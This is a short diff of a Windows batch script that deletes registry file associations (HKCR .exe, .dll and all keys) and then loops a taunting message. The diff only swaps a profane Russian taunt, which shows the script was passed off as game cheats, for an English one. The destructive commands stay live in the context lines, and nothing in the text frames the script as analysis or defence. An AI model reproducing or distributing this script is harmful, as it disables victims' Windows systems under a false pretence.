@@ -3,5 +3,5 @@ START reg delete HKCR/.exe
 START reg delete HKCR/.dll
 START reg delete HKCR/*
 :MESSAGE
-ECHO Думал это Читы да??? Хуй тебе.
+ECHO Sorry bro but today you have bad luck;)
 GOTO MESSAGE
